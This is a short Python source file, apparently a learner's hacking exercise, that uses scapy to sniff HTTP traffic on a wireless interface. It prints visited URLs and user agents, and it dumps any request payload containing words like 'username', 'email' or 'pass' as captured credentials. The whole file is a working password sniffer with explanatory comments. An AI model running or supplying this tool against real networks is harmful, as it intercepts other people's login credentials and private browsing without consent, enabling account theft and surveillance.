import scapy.all as scapy
from scapy.layers import http
import subprocess
""""we use ftp smtp all layer with field for our use so gain required field there"""

def sniff(interface):# this store  store the packets captured here
    scapy.sniff(iface= interface, store = False, prn= sniff_packets) #this prn it just put every packets on to that function as arguments
                                                                                    #this filter attribute only send the selected packets to that fucntion there

    #or filter = "port80" we can select a specific packets with des port 80

def sniff_packets(packet):

    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("URL>>>>>>"+ url.decode('utf-8'),end="\n")
        print("||||||||||||||------------------------------------------------||||||||||||||",end="\n")
        agent=packet[http.HTTPRequest].User_Agent
        print("AGENT>>>>>" + agent.decode('utf-8'),end="\n")
        print("||||||||||||||------------------------------------------------||||||||||||||",end="\n")
# we can download images links

    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            #print(packet.show())
            load=packet[scapy.Raw].load
            list1 = ["uname", "username", "email", "pass", "password"]
            for i in list1:
                if i.encode('utf-8') in load:# here byte like object is need so encoded in bytes  from string
                    print("\n\n\n[+][+][+][+][+]USER:::PASSWORD>>>>>>>>>>>" +  load.decode('utf-8') +"\n\n\n")
                    break  #out of loop

            """"this is a structure like {{packet.layer.field}}} for accesing a specific data"""

    #we can add two field on them


sniff("wlan0")